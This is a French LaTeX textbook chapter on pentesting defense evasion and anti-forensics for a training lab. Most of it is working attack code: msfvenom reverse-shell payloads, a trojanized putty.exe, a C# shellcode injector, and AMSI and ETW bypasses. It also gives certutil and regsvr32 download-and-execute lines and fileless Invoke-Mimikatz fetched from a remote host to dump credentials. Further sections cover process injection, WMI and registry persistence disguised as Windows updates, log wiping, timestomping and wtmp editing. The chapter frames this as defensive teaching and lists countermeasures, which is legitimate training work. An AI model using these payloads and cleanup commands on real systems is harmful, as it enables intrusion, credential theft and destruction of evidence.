% ==============================================================================
% Fichier     : chapitres/07_evasion_antiforensic.tex
% Titre       : Évasion des Défenses et Anti-Forensics
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
% ==============================================================================

\chapter{Évasion des Défenses et Anti-Forensics}
\label{chap:evasion}

Les outils d'attaque standards, Metasploit, Mimikatz, BloodHound, sont
connus de tous les éditeurs d'antivirus (\sigle{AV}) et des systèmes de
détection comportementale (\sigle{EDR}). Pour réussir un pentest avancé
simulant un attaquant réel, il faut savoir \textbf{rendre les outils
indétectables} et \textbf{effacer les traces} de passage. Ce chapitre
présente les techniques d'évasion et d'anti-forensics utilisées par les
attaquants sophistiqués, et que les défenseurs doivent impérativement
comprendre pour déployer des contre-mesures efficaces.

\begin{boxalert}
\textbf{Avertissement éthique :} Les techniques présentées dans ce chapitre
sont des outils de compréhension défensive. Toute application hors du
laboratoire isolé ou sans mandat écrit constitue une infraction pénale
(Chapitre~\ref{chap:juridique}). En pentest réel, les techniques de
nettoyage de logs doivent être \textbf{documentées} dans le rapport
plutôt qu'exécutées, sauf accord client explicite.
\end{boxalert}

\begin{boxinfo}
\textbf{MITRE ATT\&CK, Tactique associée :}
Ce chapitre couvre \sigle{TA0005} (\textit{Defense Evasion}), notamment
T1027 (\textit{Obfuscated Files}), T1055 (\textit{Process Injection}),
T1562 (\textit{Impair Defenses}), T1070 (\textit{Indicator Removal}),
T1140 (\textit{Deobfuscate/Decode Files}).
\end{boxinfo}

% ==============================================================================
\section{Architecture des Défenses Modernes}
\label{sec:defense_architecture}
% ==============================================================================

Avant d'aborder les techniques d'évasion, il est indispensable de comprendre
l'architecture des défenses que l'on cherche à contourner.

\subsection{Antivirus (AV) vs EDR}
\label{subsec:av_vs_edr}

\begin{table}[htbp]
\centering
\caption{Comparatif AV classique vs EDR moderne}
\label{tab:av_vs_edr}
\begin{tabular}{p{3cm}p{5.5cm}p{5cm}}
\toprule
\textbf{Critère} & \textbf{AV Classique} & \textbf{EDR Moderne} \\
\midrule
Détection
    & Signatures statiques (hash de fichiers, patterns d'octets)
    & Comportement en temps réel + ML + signatures + corrélation \\
\addlinespace
Visibilité
    & Fichiers sur disque uniquement
    & Processus, mémoire, réseau, registre, appels système \\
\addlinespace
Réponse
    & Quarantaine du fichier
    & Isolation de la machine, kill process, rollback \\
\addlinespace
Contournement
    & Obfuscation, encodage, packing
    & Beaucoup plus difficile, nécessite contournement des hooks kernel \\
\addlinespace
Exemples
    & Windows Defender (mode basique), Avast, AVG
    & CrowdStrike Falcon, SentinelOne, Carbon Black, Defender ATP \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Mécanismes de Détection}
\label{subsec:detection_mechanisms}

\begin{itemize}
    \item \textbf{Détection statique (signature) :} Analyse du fichier au repos —
          recherche de séquences d'octets connues (\textit{byte patterns}),
          hashes de fichiers malveillants connus (\sigle{IOC}).
    \item \textbf{Détection comportementale (heuristique) :} Analyse du
          comportement à l'exécution, accès à \sigle{LSASS}, injection dans
          d'autres processus, connexions réseau suspectes, modifications du
          registre.
    \item \textbf{Hooks \textit{userland} :} L'\sigle{EDR} injecte une \sigle{DLL}
          dans chaque processus et \textit{hooké} les fonctions \sigle{API}
          Windows sensibles (ex.~: \texttt{NtCreateThread},
          \texttt{ReadProcessMemory}) pour intercepter les appels suspects.
    \item \textbf{ETW (\textit{Event Tracing for Windows}) :} Infrastructure
          de journalisation kernel interceptant les appels système et les
          événements de sécurité, utilisée par les \sigle{EDR} pour
          corréler les actions.
    \item \textbf{AMSI (\textit{Antimalware Scan Interface}) :} Interface
          permettant aux \sigle{AV} de scanner le contenu des scripts
          (PowerShell, VBScript, JScript) \textit{avant} exécution.
\end{itemize}

% ==============================================================================
\section{Obfuscation et Génération de Payloads}
\label{sec:obfuscation}
% ==============================================================================

\subsection{Msfvenom avec Encodage}
\label{subsec:msfvenom}

\begin{lstlisting}[language=bash, caption={Msfvenom, génération de payload obfusqué}]
# Payload Windows 64 bits avec encodeur shikata_ga_nai (5 itérations)
# IMPORTANT : payload windows/x64 pour cible 64 bits
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.100 LPORT=4444 \
         -e x64/xor_dynamic -i 5 \
         -f exe -o payload_x64.exe

# Générer en format C (pour intégration dans du code custom)
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=10.10.10.100 LPORT=4444 \
         -f c -o shellcode.c

# Format PowerShell (injection en mémoire)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.100 LPORT=4444 \
         -f ps1 -o payload.ps1
\end{lstlisting}

\begin{boxinfo}
\textbf{Limites de l'encodage Msfvenom :} Les encodeurs Msfvenom
(\textit{shikata\_ga\_nai}, \textit{xor\_dynamic}) sont bien connus des
éditeurs \sigle{AV}, leur efficacité contre les \sigle{AV} modernes
est faible. Ils restent utiles pour les systèmes non mis à jour ou pour
démontrer le concept. Pour un contournement efficace, les techniques
présentées dans les subsections suivantes sont nécessaires.
\end{boxinfo}

\subsection{Shellter, Injection dans des Binaires Légitimes}
\label{subsec:shellter}

\termecle{Shellter} injecte du shellcode dans un exécutable Windows
\textit{légitime} (ex.~: \texttt{putty.exe}, \texttt{vlc.exe}), en
modifiant le flux d'exécution de façon dynamique. Le fichier résultant
conserve sa signature et son comportement apparents.

\begin{lstlisting}[language=bash, caption={Shellter, injection dans un binaire légitime}]
# Installation (Kali Linux)
apt install shellter -y

# Mode auto : Shellter choisit automatiquement le point d'injection
shellter
# Choisir : A (Automatic mode)
# PE Target : /tmp/putty.exe   (binaire légitime 32 bits)
# Stealth mode : Y
# Payload : L (Listed) → 1 (Meterpreter_Reverse_TCP)
# LHOST : 10.10.10.100
# LPORT : 4444

# Résultat : putty.exe modifié, se comporte normalement ET déclenche
# un reverse shell Meterpreter à l'exécution
\end{lstlisting}

\subsection{Payloads Custom, C\# et Nim}
\label{subsec:custom_payloads}

Écrire son propre code d'injection est la technique la plus efficace pour
contourner les \sigle{AV}, un payload custom ne correspond à aucune
signature connue.

\begin{lstlisting}[language=csh, caption={Injection de shellcode en C\#, template de base}]
// Template C# minimal pour injection de shellcode en mémoire
// Compile avec : csc.exe /unsafe payload.cs
using System;
using System.Runtime.InteropServices;

class Injector {
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 ms);

    static void Main() {
        // Shellcode généré avec msfvenom -f csharp
        byte[] shellcode = new byte[] { 0xfc, 0x48, ... };

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
            0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
\end{lstlisting}

\subsection{Donut, Shellcode depuis des Assemblies .NET}
\label{subsec:donut}

\termecle{Donut} convertit des assemblies .NET (Mimikatz.NET, BloodHound,
SharpHound) en shellcode injectable en mémoire, contournant ainsi la
détection basée sur les noms de fichiers.

\begin{lstlisting}[language=bash, caption={Donut, conversion assembly .NET en shellcode}]
# Convertir SharpHound.exe en shellcode injectable
./donut -a 2 -f 7 \
        -i SharpHound.exe \
        -p "-c All --domain lizbiz.local" \
        -o sharphound_shellcode.bin

# Injecter le shellcode avec un loader custom (C# ou Nim)
# Le binaire SharpHound ne touche jamais le disque
\end{lstlisting}

% ==============================================================================
\section{Bypass AMSI et ETW}
\label{sec:amsi_bypass}
% ==============================================================================

\subsection{AMSI (\textit{Antimalware Scan Interface})}
\label{subsec:amsi}

\sigle{AMSI} est une interface Windows qui transmet le contenu des scripts
PowerShell, VBScript et JScript à l'\sigle{AV} avant exécution. Son
contournement est nécessaire dès qu'on utilise PowerShell offensif.

\begin{lstlisting}[language=PowerShell, caption={Techniques de bypass AMSI, du simple au robuste}]
# ── Technique 1 : Patch de la fonction AmsiScanBuffer en mémoire ──────
# (la plus courante, patche l'AMSI dans le processus PowerShell courant)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# ── Technique 2 : Forcer l'erreur d'initialisation AMSI ──────────────
[Runtime.InteropServices.Marshal]::WriteByte(
    (Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h, string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);' -Name W -PassThru)::GetProcAddress(([W]::LoadLibrary("amsi")), "AmsiScanBuffer"),
    0xB8   # Opcode ret direct (nop le scan)
)

# ── Technique 3 : Obfuscation via chaîne concaténée ───────────────────
# Contourne la détection statique des bypass connus
$s = 'Am'+'si'+'Utils'
$t = [Ref].Assembly.GetType("System.Management.Automation.$s")
$u = $t.GetField('amsi'+'Init'+'Failed','NonPublic,Static')
$u.SetValue($null,$true)
\end{lstlisting}

\subsection{ETW (\textit{Event Tracing for Windows}) Patching}
\label{subsec:etw}

\sigle{ETW} fournit aux \sigle{EDR} une visibilité sur les appels système.
Le patching d'ETW aveugle temporairement la télémétrie de l'\sigle{EDR}.

\begin{lstlisting}[language=PowerShell, caption={ETW Patching, désactivation de la télémétrie PowerShell}]
# Patcher EtwEventWrite pour renvoyer SUCCESS sans loguer
$a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
$b=$a.GetField('m_etwProvider','NonPublic,Instance')
$c=$b.GetValue([Ref].Assembly.GetType(
    'System.Management.Automation.Tracing.PSEtwLogProvider').GetField(
    'etwProvider','NonPublic,Static').GetValue($null))
[System.Runtime.InteropServices.Marshal]::WriteInt64(
    $c.m_regHandle,0)
\end{lstlisting}

% ==============================================================================
\section{Living Off The Land (LotL)}
\label{sec:lotl}
% ==============================================================================

La technique \termecle{LotL} (\textit{Living Off The Land}) consiste à utiliser
des outils légitimes présents par défaut dans le système pour réaliser des
actions offensives. Ces binaires sont signés par Microsoft et généralement
autorisés par les \sigle{AV}. \textbf{MITRE T1218.}

\begin{table}[htbp]
\centering
\caption{Living Off The Land Binaries (LoLBins), usages offensifs}
\label{tab:lolbins}
\begin{tabular}{p{2.5cm}p{3.8cm}p{6.5cm}}
\toprule
\textbf{Outil} & \textbf{Usage légitime} & \textbf{Usage offensif} \\
\midrule
\texttt{certutil.exe}
    & Gestion de certificats
    & Téléchargement de fichiers (\texttt{-urlcache -split -f}) \\
\addlinespace
\texttt{mshta.exe}
    & Exécution d'applications HTML
    & Exécution de scripts \sigle{HTA} malveillants sans \sigle{EXE} \\
\addlinespace
\texttt{regsvr32.exe}
    & Enregistrement de DLL
    & Exécution de code distant via \textit{scriptlets} \sigle{COM} \\
\addlinespace
\texttt{powershell.exe}
    & Administration système
    & Exécution de payloads en mémoire, bypass \sigle{AMSI} \\
\addlinespace
\texttt{wmic.exe}
    & Gestion \sigle{WMI}
    & Exécution de commandes à distance, persistance via \sigle{WMI} \\
\addlinespace
\texttt{bitsadmin.exe}
    & Transferts en arrière-plan
    & Téléchargement de fichiers malveillants \\
\addlinespace
\texttt{rundll32.exe}
    & Exécution de fonctions DLL
    & Exécution de shellcode via DLL custom \\
\addlinespace
\texttt{msiexec.exe}
    & Installation de packages MSI
    & Exécution de MSI malveillant (\textit{AlwaysInstallElevated}) \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[language=PowerShell, caption={LotL, exemples opérationnels}]
# Téléchargement via certutil (contourne les proxies web basiques)
certutil -urlcache -split -f http://10.10.10.100:8080/payload.exe C:\Temp\p.exe

# Exécution de code distant via regsvr32 (Squiblydoo)
regsvr32 /s /n /u /i:http://10.10.10.100:8080/malicious.sct scrobj.dll

# Injection de code en mémoire via PowerShell (sans fichier sur disque)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand \
           [BASE64_ENCODED_COMMAND]

# Chargement de Mimikatz en mémoire (sans toucher le disque)
powershell "IEX (New-Object Net.WebClient).DownloadString(\
    'http://10.10.10.100:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
\end{lstlisting}

\begin{boxlizbiz}
\textbf{Cas LiZbiZ, Mimikatz fileless :}
Au lieu de déposer \texttt{mimikatz.exe} sur le disque (détecté immédiatement
par Windows Defender), l'attaquant charge Invoke-Mimikatz directement en
mémoire via PowerShell après bypass AMSI. Aucun fichier n'est écrit sur le
disque dur, le \sigle{AV} basé sur les signatures de fichiers est aveugle.

\begin{lstlisting}[language=PowerShell]
# Étape 1 : Bypass AMSI
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Étape 2 : Charger Mimikatz en mémoire
IEX (New-Object Net.WebClient).DownloadString(
    'http://10.10.10.100:8080/Invoke-Mimikatz.ps1')

# Étape 3 : Exécuter
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
\end{lstlisting}
\textbf{MITRE :} T1059.001 (\textit{PowerShell}), T1218 (LoLBins).
\end{boxlizbiz}

% ==============================================================================
\section{Attaques Fileless (Sans Fichier)}
\label{sec:fileless}
% ==============================================================================

Les attaques \termecle{fileless} ne déposent aucun fichier sur le disque —
le code malveillant réside uniquement en mémoire vive, dans le registre,
ou dans des mécanismes de persistance \sigle{WMI}. \textbf{MITRE T1027.}

\subsection{Injection de Processus}
\label{subsec:process_injection}

\begin{lstlisting}[language=PowerShell, caption={Process Injection, shellcode dans un processus légitime}]
# Injection dans un processus légitime (ex : notepad.exe)
# via les API Windows VirtualAllocEx / WriteProcessMemory / CreateRemoteThread

# PowerShell, injection via P/Invoke
$notepad = Start-Process notepad -PassThru
$handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $notepad.Id)

# Allouer de la mémoire dans le processus cible
$addr = [Kernel32]::VirtualAllocEx($handle, [IntPtr]::Zero,
    $shellcode.Length, 0x3000, 0x40)

# Écrire le shellcode
[Kernel32]::WriteProcessMemory($handle, $addr, $shellcode,
    $shellcode.Length, [ref]0)

# Créer un thread distant exécutant le shellcode
[Kernel32]::CreateRemoteThread($handle, [IntPtr]::Zero, 0,
    $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
\end{lstlisting}

\subsection{Persistance Fileless via le Registre}
\label{subsec:registry_fileless}

\begin{lstlisting}[language=PowerShell, caption={Persistance fileless via le registre Windows}]
# Stocker le payload PowerShell encodé dans le registre
$payload = "powershell -WindowStyle Hidden -EncodedCommand [B64_PAYLOAD]"

# Clé de démarrage automatique (Run)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" \
    -Name "WindowsUpdate" -Value $payload

# Alternative plus discrète : RunOnce (s'exécute une fois au démarrage)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" \
    -Name "SecurityScan" -Value $payload
\end{lstlisting}

\subsection{Persistance via WMI Event Subscription}
\label{subsec:wmi_persistence}

La persistance via \sigle{WMI} est extrêmement discrète car elle n'ajoute
aucune entrée visible dans les programmes de démarrage.

\begin{lstlisting}[language=PowerShell, caption={WMI Event Subscription, persistance sans fichier}]
# Créer un filtre d'événement (déclencheur : 60 secondes après démarrage)
$filter = Set-WmiInstance -Namespace root\subscription \
    -Class __EventFilter \
    -Arguments @{
        Name="WindowsDefenderUpdate"
        EventNameSpace="root\cimv2"
        QueryLanguage="WQL"
        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE
               TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
               AND TargetInstance.SystemUpTime >= 60"
    }

# Créer un consommateur (action : exécuter le payload)
$consumer = Set-WmiInstance -Namespace root\subscription \
    -Class CommandLineEventConsumer \
    -Arguments @{
        Name="WindowsDefenderUpdate"
        CommandLineTemplate="powershell -EncodedCommand [B64_PAYLOAD]"
    }

# Lier le filtre au consommateur
Set-WmiInstance -Namespace root\subscription \
    -Class __FilterToConsumerBinding \
    -Arguments @{Filter=$filter; Consumer=$consumer}
\end{lstlisting}

% ==============================================================================
\section{Anti-Forensics : Effacer ses Traces}
\label{sec:antiforensics}
% ==============================================================================

Une fois l'objectif démontré, le pentester doit nettoyer les artéfacts laissés
— ou documenter dans le rapport ce qu'il \textit{aurait pu} nettoyer.

\subsection{Nettoyage des Journaux Windows}
\label{subsec:log_clearing}

\begin{lstlisting}[language=PowerShell, caption={Nettoyage des journaux Windows}]
# Effacer tous les journaux Windows (action bruyante, Event ID 1102)
wevtutil el | foreach { wevtutil cl $_ }

# Effacer uniquement les journaux de sécurité et système
wevtutil cl Security
wevtutil cl System
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Supprimer les logs Sysmon (si installé)
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
\end{lstlisting}

\begin{boxalert}
\textbf{Attention opérationnelle :} Effacer les journaux génère
l'événement \textbf{Event ID~1102} (Security log cleared) ou
\textbf{Event ID~104} (System log cleared), paradoxalement, c'est
une preuve de compromission évidente pour les analystes SOC. En pentest,
documenter \og{}nous aurions pu effacer les logs\fg{} est préférable
à les effacer réellement, sauf accord contractuel explicite.
\end{boxalert}

\subsection{Timestomping}
\label{subsec:timestomping}

Modification des horodatages \sigle{MACE} (\textit{Modified, Accessed,
Created, Entry Modified}) pour perturber la chronologie forensique.

\begin{lstlisting}[language=bash, caption={Timestomping, Linux et Windows}]
# ── LINUX ─────────────────────────────────────────────────────────────
# Modifier mtime et atime d'un fichier
touch -t 202201010000 backdoor.sh
# Copier les timestamps d'un fichier légitime
touch -r /bin/ls backdoor.sh

# ── WINDOWS (Meterpreter) ─────────────────────────────────────────────
meterpreter > timestomp C:\Temp\payload.exe -z
# -z : zéroiser tous les timestamps

meterpreter > timestomp C:\Temp\payload.exe -f C:\Windows\System32\calc.exe
# -f : copier les timestamps d'un fichier légitime

# ── WINDOWS (PowerShell) ──────────────────────────────────────────────
$file = Get-Item "C:\Temp\payload.exe"
$file.LastWriteTime  = [datetime]"2022-01-15 10:30:00"
$file.LastAccessTime = [datetime]"2022-01-15 10:30:00"
$file.CreationTime   = [datetime]"2022-01-15 10:30:00"
\end{lstlisting}

\subsection{Suppression des Artefacts d'Exécution}
\label{subsec:artifacts}

\begin{lstlisting}[language=PowerShell, caption={Nettoyage complet des artefacts Windows}]
# Historique PowerShell
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

# Fichiers temporaires
Remove-Item -Recurse -Force $env:TEMP\* -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force "C:\Windows\Temp\*" -ErrorAction SilentlyContinue

# Prefetch (traces d'exécution de programmes, nécessite droits admin)
Remove-Item C:\Windows\Prefetch\MIMIKATZ*.pf -ErrorAction SilentlyContinue

# Entrées de registre de persistance
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" \
    -Name "WindowsUpdate" -ErrorAction SilentlyContinue

# Recent files (MRU, Most Recently Used)
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" \
    -Recurse -ErrorAction SilentlyContinue
\end{lstlisting}

\begin{lstlisting}[language=bash, caption={Nettoyage des artefacts Linux}]
# Historique shell
history -c && history -w
unset HISTFILE
echo "" > ~/.bash_history
rm -f ~/.bash_history ~/.zsh_history

# Logs système (nécessite root)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Supprimer les fichiers temporaires déposés
rm -f /tmp/linpeas.sh /tmp/chisel /tmp/.lp.sh

# Effacer les traces dans les logs wtmp/btmp (connexions SSH)
utmpdump /var/log/wtmp | grep -v "ATTACKER_IP" | \
    utmpdump -r > /tmp/wtmp.clean
mv /tmp/wtmp.clean /var/log/wtmp
\end{lstlisting}

% ==============================================================================
\section{Synthèse : Tableau de Bord Évasion LiZbiZ}
\label{sec:synthese_evasion}
% ==============================================================================

\begin{table}[htbp]
\centering
\caption{Synthèse des techniques d'évasion, LiZbiZ}
\label{tab:synthese_evasion}
\begin{tabular}{p{3cm}p{3.5cm}p{3cm}p{4cm}}
\toprule
\textbf{Technique} & \textbf{Objectif} & \textbf{MITRE} & \textbf{Contre-mesure} \\
\midrule
AMSI Bypass
    & Exécuter PowerShell offensif
    & T1562.001
    & AMSI providers tiers, Constrained Language Mode \\
\addlinespace
LotL / Certutil
    & Télécharger sans AV
    & T1218
    & Surveillance des LoLBins, AppLocker \\
\addlinespace
Invoke-Mimikatz
    & Credential dump sans fichier
    & T1059.001
    & Credential Guard, PPL pour LSASS \\
\addlinespace
Process Injection
    & Masquer le code malveillant
    & T1055
    & Surveillance API CreateRemoteThread \\
\addlinespace
WMI Persistence
    & Persistance invisible
    & T1546.003
    & Surveillance WMI subscriptions \\
\addlinespace
Timestomping
    & Perturber la forensique
    & T1070.006
    & \$MFT (NTFS journal), logs Sysmon \\
\addlinespace
Log Clearing
    & Effacer les traces
    & T1070.001
    & SIEM externe, forwarding immédiat \\
\bottomrule
\end{tabular}
\end{table}

% ==============================================================================
\section*{Points Clés à Retenir}
% ==============================================================================

\begin{boxinfo}
\textbf{Ce qu'il faut retenir de ce chapitre :}
\begin{enumerate}
    \item Les \sigle{EDR} modernes voient \textbf{bien plus} que les \sigle{AV}
          classiques, contourner un \sigle{EDR} requiert le bypass des
          hooks userland et d'\sigle{ETW}.
    \item \textbf{AMSI} doit être bypassé avant tout usage de PowerShell
          offensif, plusieurs techniques existent selon le niveau de
          détection.
    \item Les \textbf{LoLBins} sont souvent sous-surveillés, les SOC
          oublient que certutil et regsvr32 peuvent télécharger et exécuter
          du code.
    \item Les \textbf{attaques fileless} ne laissent aucune trace sur disque
         , seule une surveillance mémoire et comportementale les détecte.
    \item \textbf{Effacer les logs génère un événement} (ID~1102/104) —
          documenter dans le rapport plutôt qu'exécuter en conditions réelles.
    \item Le \textbf{timestomping} ne résiste pas à l'analyse du journal
          \sigle{NTFS} (\texttt{\$MFT}), les horodatages \sigle{MFT}
          ne sont pas modifiés par \texttt{touch}/Meterpreter.
\end{enumerate}
\end{boxinfo}

% ==============================================================================
\section*{Exercice Pratique}
% ==============================================================================

\begin{boxexo}
\textbf{Exercice 7.1, Bypass AMSI et Invoke-Mimikatz fileless}

\medskip
\textbf{Cible :} VM Windows Server 2019 du lab LiZbiZ.

\medskip
\textbf{Tâches :}
\begin{enumerate}
    \item Tenter de lancer \texttt{Invoke-Mimikatz} directement dans
          PowerShell, observer le blocage AMSI.
    \item Appliquer la technique de bypass AMSI par patch de
          \texttt{amsiInitFailed}.
    \item Réessayer \texttt{Invoke-Mimikatz}, confirmer l'exécution.
    \item Mettre en place une persistance WMI Event Subscription avec
          un payload bénin (ex.~: \texttt{calc.exe}) et vérifier
          l'exécution au démarrage.
    \item Nettoyer tous les artefacts et vérifier avec l'Event Viewer
          que l'Event ID~1102 a été généré.
    \item Identifier dans le rapport la contre-mesure qui aurait détecté
          chaque technique.
\end{enumerate}

\medskip
\textbf{Livrable :} Tableau \ref{tab:synthese_evasion} complété pour
le lab LiZbiZ + justification de chaque contre-mesure.
\end{boxexo}
